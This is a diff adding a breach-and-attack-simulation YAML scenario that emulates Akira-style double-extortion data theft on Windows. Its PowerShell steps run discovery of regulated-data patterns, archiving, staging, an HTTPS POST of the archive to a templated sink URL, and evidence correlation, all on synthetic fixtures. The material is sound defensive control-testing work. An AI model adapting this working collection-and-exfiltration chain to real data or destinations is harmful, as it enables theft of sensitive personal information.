@@ -1,0 +1,432 @@
+# =============================================================================
+# Akira Double-Extortion Assessment (Windows, controlled fixtures)
+# =============================================================================
+id: akira-double-extortion-assessment
+version: "1.0.0"
+product_line: ransomware
+name: Akira Double-Extortion Assessment
+description: >
+  Five-step assessment of the data-theft half of Akira-style double extortion
+  (CISA AA24-109A): sensitive data discovery (D1), collection and archiving
+  (D2), local and optional network staging (D3), exfiltration through the
+  platform's own controlled sink (D4) and evidence correlation of the chain (D5).
+  Uses only a synthetic fixture BAS plants and removes; no real customer data is
+  read or sent, and no real exfiltration tool (rclone, WinSCP) is executed, only
+  detected as present. The D5 verdict says whether the whole chain was viable
+  end to end. The ledger is endpoint-local; sink receipt and detection evidence
+  are verified server-side and are not part of it. Work directory
+  %TEMP%\bas_dxe_<run> persists across D1-D4 and is removed by D5.
+
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+severity: high
+estimated_duration_sec: 120
+abort_conditions:
+  - "Free disk in %TEMP% < 64 MB"
+  - "PowerShell major version < 5"
+tags:
+  - akira
+  - ransomware
+  - double-extortion
+  - exfiltration
+  - t1083
+  - t1560
+  - t1074
+  - t1041
+  - t1657
+  - mitre
+  - bas
+mitre_phases:
+  - discovery
+  - collection
+  - exfiltration
+  - impact
+attck_tactics:
+  - TA0007  # Discovery
+  - TA0009  # Collection
+  - TA0010  # Exfiltration
+  - TA0040  # Impact
+references:
+  - "CISA AA24-109A - #StopRansomware: Akira Ransomware"
+  - "MITRE ATT&CK T1083, T1560.001, T1074.001, T1041, T1657"
+
+live_policy:
+  block_on_domain_controller: false
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+  require_run_id: false
+  require_temp_disk_mb: 64
+  min_powershell_major: 5
+
+variables:
+  run_id: "{{env.BAS_RUN_ID | default(random_hex8)}}"
+  sim_tag: "[BAS-SIM-DXE]"
+
+steps:
+  # ---------------------------------------------------------------------------
+  - id: dxe-d1-sensitive-data-discovery
+    name: "Double-Extortion D1 - Sensitive Data Discovery (T1083)"
+    technique_id: T1083
+    detection_profiles:
+      - windows_file_discovery
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 90
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    severity: high
+    confidence: medium
+    reversible: true
+    blast_radius: "Plants a BAS-owned fixture of 8 synthetic files under %TEMP%\bas_dxe_<run> and scans it for PAN/Aadhaar/card patterns. Optional BAS_DATA_SCAN_PATHS gives pattern-match COUNTS only (no names or content)."
+    preconditions: ["Windows host.", "Steps D1-D5 run in order within one run."]
+    postconditions: ["PASS, FAIL or SKIP with a stated reason; the BAS work directory is removed and removal verified by D5."]
+    abort_on: []
+    telemetry:
+      - "Sysmon EID 11: bulk file creation and a zip archive in %TEMP%\\bas_dxe_<run>"
+      - "Sysmon EID 3: HTTPS connection to the orchestrator sink (D4)"
+    detection:
+      - "EDR/DLP: regulated-data pattern scan, archive creation and staging followed by an outbound transfer of the archive"
+    expected_telemetry_count: 1
+    false_positive_notes: "Backup, e-discovery and compliance tooling perform discovery and archiving; correlate with process, account and destination."
+    mitigations:
+      - "Endpoint DLP on regulated-data patterns and archive creation outside approved paths."
+      - "Egress allow-listing; block unsanctioned file-transfer tools (rclone, WinSCP)."
+      - "Alert on discovery, archive and outbound-transfer sequences from one host."
+    references: ["CISA AA24-109A"]
+    evidence: ["Emit sensitive_files_identified and fixture_files_created."]
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { 'norun' }
+      $work = Join-Path $env:TEMP "bas_dxe_$runId"
+      $fixture = Join-Path $work 'fixture'
+      $stage = Join-Path $work 'stage'
+      $ledger = Join-Path $work 'ledger.jsonl'
+      function Add-Ledger($step, $result, $facts) {
+        if (-not (Test-Path $work)) { return }
+        $o = [ordered]@{ step=$step; ts=(Get-Date).ToUniversalTime().ToString('o'); result=$result; facts=$facts }
+        Add-Content -Path $ledger -Value ($o | ConvertTo-Json -Compress -Depth 4) -Encoding UTF8
+      }
+      $rxPan = '\b[A-Z]{5}\d{4}[A-Z]\b'; $rxAadhaar = '\b\d{12}\b'; $rxCard = '\b4111111111111111\b'
+      if (Test-Path $work) { Remove-Item $work -Recurse -Force }
+      New-Item -ItemType Directory -Path $fixture -Force | Out-Null
+      $made = 0
+      if (Test-Path $fixture) {
+        $files = @{
+          'finance\customers.csv' = "[BAS-SIM-DXE] CustomerID,PAN,Aadhaar,Card`r`nC001,ABCDE1234F,123456789012,4111111111111111`r`nC002,PQRSX5678Z,210987654321,4111111111111111"
+          'finance\ledger_q3.csv' = "[BAS-SIM-DXE] Account,PAN`r`nA77,FGHIJ9012K"
+          'hr\payroll.csv'        = "[BAS-SIM-DXE] Emp,Aadhaar,Salary`r`nE01,345678901234,95000"
+          'hr\kyc_notes.txt'      = "[BAS-SIM-DXE] KYC record PAN KLMNO3456P Aadhaar 456789012345"
+          'legal\settlement.txt'  = "[BAS-SIM-DXE] Confidential settlement card 4111111111111111"
+          'eng\readme.txt'        = "[BAS-SIM-DXE] build notes, nothing sensitive"
+          'eng\todo.txt'          = "[BAS-SIM-DXE] refactor later"
+          'public\brochure.txt'   = "[BAS-SIM-DXE] public marketing copy"
+        }
+        foreach ($k in $files.Keys) {
+          $p = Join-Path $fixture $k
+          New-Item -ItemType Directory -Path (Split-Path $p) -Force | Out-Null
+          try { [System.IO.File]::WriteAllText($p, $files[$k]) } catch { }
+          if (Test-Path $p) { $made++ }
+        }
+      }
+      $scanned = 0; $hits = @()
+      foreach ($f in @(Get-ChildItem -Path $fixture -Recurse -File -ErrorAction SilentlyContinue)) {
+        $scanned++
+        $t = [System.IO.File]::ReadAllText($f.FullName)
+        if ($t -cmatch $rxPan -or $t -match $rxAadhaar -or $t -match $rxCard) { $hits += $f.FullName }
+      }
+      $extra = 'not_requested'
+      if ($env:BAS_DATA_SCAN_PATHS) {
+        $n = 0; $m = 0
+        foreach ($root in @($env:BAS_DATA_SCAN_PATHS -split ';' | Where-Object { $_ -and (Test-Path $_) })) {
+          foreach ($f in @(Get-ChildItem -Path $root -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -le 1MB } | Select-Object -First 2000)) {
+            $n++
+            try { $t = [System.IO.File]::ReadAllText($f.FullName); if ($t -cmatch $rxPan -or $t -match $rxAadhaar -or $t -match $rxCard) { $m++ } } catch { }
+          }
+        }
+        $extra = "scanned=$n pattern_matching_files=$m (counts only; no names or content recorded)"
+      }
+      Add-Ledger 'D1' $(if ($hits.Count -gt 0) { 'executed' } else { 'blocked' }) @{ fixture_files=$made; scanned=$scanned; sensitive_files=$hits.Count }
+      Write-Output "EVIDENCE T1083: fixture_files_created=$made files_scanned=$scanned sensitive_files_identified=$($hits.Count) operator_scan_paths=$extra work_dir=$work. Synthetic fixture only. [BAS-SIM-DXE-D1]"
+      if ($hits.Count -gt 0) { Write-Output "FAIL: a script identified $($hits.Count) sensitive-data files (PAN/Aadhaar/card patterns) without intervention - discovery of regulated data is not prevented or alerted. [BAS-SIM-DXE-D1]" }
+      elseif ($made -eq 0) { Write-Output "PASS: the fixture could not be created or read; endpoint controls blocked the discovery precondition (see EVIDENCE). [BAS-SIM-DXE-D1]" }
+      else { Write-Output "PASS: fixture files were created but sensitive-data discovery was blocked or returned nothing. [BAS-SIM-DXE-D1]" }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  - id: dxe-d2-collection-archiving
+    name: "Double-Extortion D2 - Data Collection and Archiving (T1560.001)"
+    technique_id: T1560.001
+    detection_profiles:
+      - windows_archive_staging
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 90
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    severity: high
+    confidence: medium
+    reversible: true
+    blast_radius: "Compresses the sensitive fixture files into one zip inside the BAS work directory and verifies entries and SHA-256. Reports (does not execute) presence of rclone, WinSCP, 7-Zip, WinRAR and FileZilla."
+    preconditions: ["Windows host.", "Steps D1-D5 run in order within one run."]
+    postconditions: ["PASS, FAIL or SKIP with a stated reason; the BAS work directory is removed and removal verified by D5."]
+    abort_on: []
+    telemetry:
+      - "Sysmon EID 11: bulk file creation and a zip archive in %TEMP%\\bas_dxe_<run>"
+      - "Sysmon EID 3: HTTPS connection to the orchestrator sink (D4)"
+    detection:
+      - "EDR/DLP: regulated-data pattern scan, archive creation and staging followed by an outbound transfer of the archive"
+    expected_telemetry_count: 1
+    false_positive_notes: "Backup, e-discovery and compliance tooling perform discovery and archiving; correlate with process, account and destination."
+    mitigations:
+      - "Endpoint DLP on regulated-data patterns and archive creation outside approved paths."
+      - "Egress allow-listing; block unsanctioned file-transfer tools (rclone, WinSCP)."
+      - "Alert on discovery, archive and outbound-transfer sequences from one host."
+    references: ["CISA AA24-109A"]
+    evidence: ["Emit archive_entries, archive_sha256 and tools present."]
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { 'norun' }
+      $work = Join-Path $env:TEMP "bas_dxe_$runId"
+      $fixture = Join-Path $work 'fixture'
+      $stage = Join-Path $work 'stage'
+      $ledger = Join-Path $work 'ledger.jsonl'
+      function Add-Ledger($step, $result, $facts) {
+        if (-not (Test-Path $work)) { return }
+        $o = [ordered]@{ step=$step; ts=(Get-Date).ToUniversalTime().ToString('o'); result=$result; facts=$facts }
+        Add-Content -Path $ledger -Value ($o | ConvertTo-Json -Compress -Depth 4) -Encoding UTF8
+      }
+      $rxPan = '\b[A-Z]{5}\d{4}[A-Z]\b'; $rxAadhaar = '\b\d{12}\b'; $rxCard = '\b4111111111111111\b'
+      if (-not (Test-Path $fixture)) { Write-Output "SKIP: prerequisite missing (no D1 fixture for this run; run D1 first). [BAS-SIM-DXE-D2]"; return }
+      $tools = @()
+      foreach ($n in 'rclone.exe','winscp.exe','winscp.com','7z.exe','winrar.exe','rar.exe','filezilla.exe') {
+        $c = Get-Command $n -ErrorAction SilentlyContinue
+        if ($c) { $tools += $n } else { foreach ($d in "$env:ProgramFiles","${env:ProgramFiles(x86)}") { if ($d -and (Get-ChildItem -Path $d -Filter $n -Recurse -Depth 2 -ErrorAction SilentlyContinue | Select-Object -First 1)) { $tools += $n; break } } }
+      }
+      $sens = @(Get-ChildItem -Path $fixture -Recurse -File | Where-Object { $t = [System.IO.File]::ReadAllText($_.FullName); $t -cmatch $rxPan -or $t -match $rxAadhaar -or $t -match $rxCard })
+      New-Item -ItemType Directory -Path $stage -Force | Out-Null
+      $zip = Join-Path $stage "collected_$runId.zip"
+      $tmpList = @($sens | ForEach-Object { $_.FullName })
+      try { Compress-Archive -Path $tmpList -DestinationPath $zip -Force -ErrorAction Stop } catch { }
+      $entries = 0; $hash = $null; $bytes = 0
+      if (Test-Path $zip) {
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        try { $z = [System.IO.Compression.ZipFile]::OpenRead($zip); $entries = $z.Entries.Count; $z.Dispose() } catch { }
+        $hash = (Get-FileHash $zip -Algorithm SHA256).Hash; $bytes = (Get-Item $zip).Length
+      }
+      $ok = ($entries -eq $sens.Count -and $entries -gt 0)
+      Add-Ledger 'D2' $(if ($ok) { 'executed' } else { 'blocked' }) @{ archive_entries=$entries; expected=$sens.Count; sha256=$hash; bytes=$bytes }
+      Write-Output "EVIDENCE T1560.001: sensitive_files_collected=$($sens.Count) archive_entries=$entries archive_bytes=$bytes archive_sha256=$hash exfil_or_archive_tools_present=[$(($tools | Sort-Object -Unique) -join ',')] (presence only; no tool was executed). [BAS-SIM-DXE-D2]"
+      if ($ok) { Write-Output "FAIL: $entries sensitive files were collected into an archive and the archive contents were verified - archiving of collected data was not blocked. [BAS-SIM-DXE-D2]" }
+      elseif ($sens.Count -eq 0) { Write-Output "SKIP: prerequisite missing (no sensitive fixture files to collect). [BAS-SIM-DXE-D2]" }
+      else { Write-Output "PASS: archive creation was blocked or incomplete (entries=$entries of $($sens.Count)). [BAS-SIM-DXE-D2]" }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  - id: dxe-d3-data-staging
+    name: "Double-Extortion D3 - Local and Network Data Staging (T1074.001)"
+    technique_id: T1074.001
+    detection_profiles:
+      - windows_archive_staging
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 90
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    severity: high
+    confidence: medium
+    reversible: true
+    blast_radius: "Copies the archive into a BAS-owned staging area and hash-verifies it. Network staging only with BAS_CONFIRM_NETWORK_STAGING=true (exact) plus BAS_STAGING_SHARE; the share copy is removed and removal verified."
+    preconditions: ["Windows host.", "Steps D1-D5 run in order within one run."]
+    postconditions: ["PASS, FAIL or SKIP with a stated reason; the BAS work directory is removed and removal verified by D5."]
+    abort_on: []
+    telemetry:
+      - "Sysmon EID 11: bulk file creation and a zip archive in %TEMP%\\bas_dxe_<run>"
+      - "Sysmon EID 3: HTTPS connection to the orchestrator sink (D4)"
+    detection:
+      - "EDR/DLP: regulated-data pattern scan, archive creation and staging followed by an outbound transfer of the archive"
+    expected_telemetry_count: 1
+    false_positive_notes: "Backup, e-discovery and compliance tooling perform discovery and archiving; correlate with process, account and destination."
+    mitigations:
+      - "Endpoint DLP on regulated-data patterns and archive creation outside approved paths."
+      - "Egress allow-listing; block unsanctioned file-transfer tools (rclone, WinSCP)."
+      - "Alert on discovery, archive and outbound-transfer sequences from one host."
+    references: ["CISA AA24-109A"]
+    evidence: ["Emit local_staged_hash_verified and network_staging."]
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { 'norun' }
+      $work = Join-Path $env:TEMP "bas_dxe_$runId"
+      $fixture = Join-Path $work 'fixture'
+      $stage = Join-Path $work 'stage'
+      $ledger = Join-Path $work 'ledger.jsonl'
+      function Add-Ledger($step, $result, $facts) {
+        if (-not (Test-Path $work)) { return }
+        $o = [ordered]@{ step=$step; ts=(Get-Date).ToUniversalTime().ToString('o'); result=$result; facts=$facts }
+        Add-Content -Path $ledger -Value ($o | ConvertTo-Json -Compress -Depth 4) -Encoding UTF8
+      }
+      $rxPan = '\b[A-Z]{5}\d{4}[A-Z]\b'; $rxAadhaar = '\b\d{12}\b'; $rxCard = '\b4111111111111111\b'
+      $zip = Join-Path $stage "collected_$runId.zip"
+      if (-not (Test-Path $zip)) { Write-Output "SKIP: prerequisite missing (no D2 archive for this run). [BAS-SIM-DXE-D3]"; return }
+      $hash0 = (Get-FileHash $zip -Algorithm SHA256).Hash
+      $local = Join-Path $work 'staging_area'
+      New-Item -ItemType Directory -Path $local -Force | Out-Null
+      $dst = Join-Path $local "collected_$runId.zip"
+      try { Copy-Item $zip $dst -Force -ErrorAction Stop } catch { }
+      $localOk = (Test-Path $dst) -and ((Get-FileHash $dst -Algorithm SHA256).Hash -eq $hash0)
+      $net = 'not_attempted'
+      $gate = ($env:BAS_CONFIRM_NETWORK_STAGING -ceq 'true')
+      if ($gate -and $env:BAS_STAGING_SHARE) {
+        $nd = Join-Path $env:BAS_STAGING_SHARE "bas_dxe_$runId.zip"
+        try { Copy-Item $zip $nd -Force -ErrorAction Stop } catch { }
+        $copied = (Test-Path $nd) -and ((Get-FileHash $nd -Algorithm SHA256).Hash -eq $hash0)
+        Remove-Item $nd -Force -ErrorAction SilentlyContinue
+        $gone = -not (Test-Path $nd)
+        $net = "copied=$copied removed=$gone"
+        if (-not $gone) { Write-Output "WARNING: staged copy $nd could not be removed from the share; delete it manually. [BAS-SIM-DXE-D3]" }
+      } elseif ($gate) { $net = 'gate_set_but_BAS_STAGING_SHARE_missing' }
+      Add-Ledger 'D3' $(if ($localOk) { 'executed' } else { 'blocked' }) @{ local_staged=$localOk; network=$net }
+      Write-Output "EVIDENCE T1074.001: local_staged_hash_verified=$localOk network_staging=$net staging_dir=$local. Network staging runs only with BAS_CONFIRM_NETWORK_STAGING=true and BAS_STAGING_SHARE. [BAS-SIM-DXE-D3]"
+      if ($localOk) { Write-Output "FAIL: the collected archive was staged in a collection directory and verified by hash without intervention. [BAS-SIM-DXE-D3]" }
+      else { Write-Output "PASS: staging of the collected archive was blocked or failed. [BAS-SIM-DXE-D3]" }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  - id: dxe-d4-exfiltration-channel
+    name: "Double-Extortion D4 - Exfiltration Channel Validation (T1041)"
+    technique_id: T1041
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 90
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    severity: high
+    confidence: medium
+    reversible: true
+    blast_radius: "POSTs the synthetic archive (base64) to the platform own DLP sink over HTTPS after a reachability probe. No external destination; no real data. Unresolved sink placeholders make the step SKIP. Cloud-storage exfiltration over a sync client (rclone or WinSCP style, T1567.002) is validated against the approved sink by the dlp-exfiltration-cloud-storage scenario and is deliberately not duplicated here."
+    preconditions: ["Windows host.", "Steps D1-D5 run in order within one run."]
+    postconditions: ["PASS, FAIL or SKIP with a stated reason; the BAS work directory is removed and removal verified by D5."]
+    abort_on: []
+    telemetry:
+      - "Sysmon EID 11: bulk file creation and a zip archive in %TEMP%\\bas_dxe_<run>"
+      - "Sysmon EID 3: HTTPS connection to the orchestrator sink (D4)"
+    detection:
+      - "EDR/DLP: regulated-data pattern scan, archive creation and staging followed by an outbound transfer of the archive"
+    expected_telemetry_count: 1
+    false_positive_notes: "Backup, e-discovery and compliance tooling perform discovery and archiving; correlate with process, account and destination."
+    mitigations:
+      - "Endpoint DLP on regulated-data patterns and archive creation outside approved paths."
+      - "Egress allow-listing; block unsanctioned file-transfer tools (rclone, WinSCP)."
+      - "Alert on discovery, archive and outbound-transfer sequences from one host."
+    references: ["CISA AA24-109A"]
+    evidence: ["Emit sink_reachability, archive_bytes_sent, client_saw_http_success."]
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { 'norun' }
+      $work = Join-Path $env:TEMP "bas_dxe_$runId"
+      $fixture = Join-Path $work 'fixture'
+      $stage = Join-Path $work 'stage'
+      $ledger = Join-Path $work 'ledger.jsonl'
+      function Add-Ledger($step, $result, $facts) {
+        if (-not (Test-Path $work)) { return }
+        $o = [ordered]@{ step=$step; ts=(Get-Date).ToUniversalTime().ToString('o'); result=$result; facts=$facts }
+        Add-Content -Path $ledger -Value ($o | ConvertTo-Json -Compress -Depth 4) -Encoding UTF8
+      }
+      $rxPan = '\b[A-Z]{5}\d{4}[A-Z]\b'; $rxAadhaar = '\b\d{12}\b'; $rxCard = '\b4111111111111111\b'
+      $zip = Join-Path $stage "collected_$runId.zip"
+      if ('{{SINK_URL}}' -match '\{\{' -or '{{SINK_TOKEN}}' -match '\{\{') { Write-Output "SKIP: prerequisite missing (SINK_URL/SINK_TOKEN not resolved; run through the orchestrator so the sink is issued). [BAS-SIM-DXE-D4]"; return }
+      if (-not (Test-Path $zip)) { Write-Output "SKIP: prerequisite missing (no D2 archive for this run). [BAS-SIM-DXE-D4]"; return }
+      $bytes = [System.IO.File]::ReadAllBytes($zip)
+      $hash = (Get-FileHash $zip -Algorithm SHA256).Hash
+      $reach = 'blocked'
+      try { Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=''; channel='reachability'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null; $reach = 'ok' } catch { }
+      $sent = $false
+      try {
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=[Convert]::ToBase64String($bytes); channel='https-archive'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 20 | Out-Null
+        $sent = $true
+      } catch { }
+      Add-Ledger 'D4' $(if ($sent) { 'executed' } else { 'blocked' }) @{ reachability=$reach; archive_bytes=$bytes.Length; sha256=$hash; http_accepted=$sent }
+      Write-Output "EVIDENCE T1041: sink_reachability=$reach archive_bytes_sent=$($bytes.Length) archive_sha256=$hash client_saw_http_success=$sent sink_receipt=verified_server_side_by_the_orchestrator (not visible to the endpoint). DLP content matching cannot inspect a zip. [BAS-SIM-DXE-D4]"
+      if ($sent) { Write-Output "FAIL: the collected archive was sent to the controlled sink over HTTPS and the request completed - egress controls did not stop archive exfiltration. [BAS-SIM-DXE-D4]" }
+      else { Write-Output "PASS: the HTTPS transfer of the archive to the controlled sink was blocked or failed (reachability=$reach). [BAS-SIM-DXE-D4]" }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  - id: dxe-d5-evidence-correlation
+    name: "Double-Extortion D5 - Double-Extortion Evidence Correlation (T1657)"
+    technique_id: T1657
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 90
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    severity: high
+    confidence: medium
+    reversible: true
+    blast_radius: "Reads the per-run evidence ledger written by D1-D4, reports the timeline and the first interrupted link, verifies archive hash consistency, then removes the BAS work directory and verifies removal."
+    preconditions: ["Windows host.", "Steps D1-D5 run in order within one run."]
+    postconditions: ["PASS, FAIL or SKIP with a stated reason; the BAS work directory is removed and removal verified by D5."]
+    abort_on: []
+    telemetry:
+      - "Sysmon EID 11: bulk file creation and a zip archive in %TEMP%\\bas_dxe_<run>"
+      - "Sysmon EID 3: HTTPS connection to the orchestrator sink (D4)"
+    detection:
+      - "EDR/DLP: regulated-data pattern scan, archive creation and staging followed by an outbound transfer of the archive"
+    expected_telemetry_count: 1
+    false_positive_notes: "Backup, e-discovery and compliance tooling perform discovery and archiving; correlate with process, account and destination."
+    mitigations:
+      - "Endpoint DLP on regulated-data patterns and archive creation outside approved paths."
+      - "Egress allow-listing; block unsanctioned file-transfer tools (rclone, WinSCP)."
+      - "Alert on discovery, archive and outbound-transfer sequences from one host."
+    references: ["CISA AA24-109A"]
+    evidence: ["Emit chain timeline, hash consistency, cleanup_verified."]
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { 'norun' }
+      $work = Join-Path $env:TEMP "bas_dxe_$runId"
+      $fixture = Join-Path $work 'fixture'
+      $stage = Join-Path $work 'stage'
+      $ledger = Join-Path $work 'ledger.jsonl'
+      function Add-Ledger($step, $result, $facts) {
+        if (-not (Test-Path $work)) { return }
+        $o = [ordered]@{ step=$step; ts=(Get-Date).ToUniversalTime().ToString('o'); result=$result; facts=$facts }
+        Add-Content -Path $ledger -Value ($o | ConvertTo-Json -Compress -Depth 4) -Encoding UTF8
+      }
+      $rxPan = '\b[A-Z]{5}\d{4}[A-Z]\b'; $rxAadhaar = '\b\d{12}\b'; $rxCard = '\b4111111111111111\b'
+      if (-not (Test-Path $ledger)) { Write-Output "SKIP: prerequisite missing (no evidence ledger for this run; D1-D4 did not record). [BAS-SIM-DXE-D5]"; if (Test-Path $work) { Remove-Item $work -Recurse -Force }; return }
+      $rows = @(Get-Content $ledger | Where-Object { $_ } | ForEach-Object { $_ | ConvertFrom-Json })
+      $order = 'D1','D2','D3','D4'
+      $by = @{}; foreach ($r in $rows) { $by[$r.step] = $r }
+      $timeline = ($order | ForEach-Object { if ($by.ContainsKey($_)) { "$_=$($by[$_].result)@$($by[$_].ts)" } else { "$_=missing" } }) -join ' ; '
+      $first = $null; foreach ($s in $order) { if (-not $by.ContainsKey($s) -or $by[$s].result -ne 'executed') { $first = $s; break } }
+      $hashChain = $true
+      if ($by.ContainsKey('D2') -and $by.ContainsKey('D4')) { $hashChain = ($by['D2'].facts.sha256 -eq $by['D4'].facts.sha256) }
+      Remove-Item $work -Recurse -Force
+      $clean = -not (Test-Path $work)
+      Write-Output "EVIDENCE T1657: chain=[$timeline] archive_hash_consistent_d2_d4=$hashChain cleanup_verified=$clean work_dir=$work. The ledger is endpoint-local and written by this host's own steps; sink receipt and detection are not part of it. [BAS-SIM-DXE-D5]"
+      if (-not $clean) { Write-Output "WARNING: work directory $work remains; remove it manually. [BAS-SIM-DXE-D5]" }
+      $missing = @($order | Where-Object { -not $by.ContainsKey($_) })
+      if ($missing.Count -gt 0) { Write-Output "SKIP: the chain cannot be judged because step(s) $($missing -join ',') recorded nothing. [BAS-SIM-DXE-D5]" }
+      elseif ($null -eq $first -and $hashChain) { Write-Output "FAIL: the full double-extortion chain (discover, collect, archive, stage, exfiltrate) ran unblocked end to end with a consistent archive hash - an attacker could steal and threaten to leak this data. [BAS-SIM-DXE-D5]" }
+      elseif ($null -eq $first) { Write-Output "FAIL: all four steps ran unblocked, but the archive hash differs between collection and exfiltration (inconsistent evidence; investigate). [BAS-SIM-DXE-D5]" }
+      else { Write-Output "PASS: the chain was interrupted at $first - controls stopped the double-extortion path at that link. [BAS-SIM-DXE-D5]" }
+    cleanup: |
+      $id = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { 'norun' }
+      Remove-Item (Join-Path $env:TEMP "bas_dxe_$id") -Recurse -Force -ErrorAction SilentlyContinue
